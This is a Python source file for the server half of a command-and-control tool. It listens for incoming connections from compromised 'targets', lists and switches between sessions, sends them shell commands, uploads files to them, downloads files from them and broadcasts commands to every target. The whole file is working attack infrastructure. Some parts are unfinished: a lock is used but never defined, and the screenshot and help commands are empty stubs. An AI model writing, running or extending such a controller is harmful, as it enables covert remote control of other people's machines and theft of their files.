import socket
import termcolor
import json
import os
import threading

# Function to safely receive JSON data from the target
def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to safely send JSON data to the target
def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

# Function to upload a file to the target
def upload_file(target, file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

# Function to download a file from the target
def download_file(target, file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        while True:
            try:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
            except socket.timeout:
                break
        target.settimeout(None)

# Function to handle communication with a single target
def target_communication(target, ip):
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            # Implementation for screenshot command goes here
            pass
        elif command == 'help':
            # Help command implementation
            pass
        else:
            # Receive and print result of other commands
            result = reliable_recv(target)
            print(result)

# Function to accept incoming connections
def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            # Perform authentication (not implemented in this example)
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip) + ' has connected!', 'green'))
        except Exception as e:
            # Log and handle exceptions
            print(f"Exception in accept_connections: {e}")

# Main function to manage command and control server
def main():
    global stop_flag, sock, targets, ips
    targets = []
    ips = []
    stop_flag = False
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind to all available network interfaces
    sock.bind(('0.0.0.0', 5555))
    sock.listen(5)
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    print(termcolor.colored('[+] Waiting For The Incoming Connections ...', 'green'))

    while True:
        command = input('[**] Command & Control Center: ')
        if command == 'targets':
            counter = 0
            for ip in ips:
                print('Session ' + str(counter) + ' --- ' + str(ip))
                counter += 1
        elif command == 'clear':
            os.system('clear')
        elif command[:7] == 'session':
            try:
                num = int(command[8:])
                tarnum = targets[num]
                tarip = ips[num]
                target_communication(tarnum, tarip)
            except:
                print('[-] No Session Under That ID Number')
        elif command == 'exit':
            for target in targets:
                reliable_send(target, 'quit')
                target.close()
            sock.close()
            stop_flag = True
            t1.join()
            break
        elif command[:4] == 'kill':
            try:
                target_index = int(command[5:])
                with targets_lock:
                    targ = targets[target_index]
                    ip = ips[target_index]
                    reliable_send(targ, 'quit')
                    targ.close()
                    targets.remove(targ)
                    ips.remove(ip)
            except (ValueError, IndexError):
                print(termcolor.colored("Invalid session ID.", 'red'))
        elif command[:7] == 'sendall':
            with targets_lock:
                for tarnumber in targets:
                    reliable_send(tarnumber, command)
        else:
            print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))

if __name__ == "__main__":
    main()
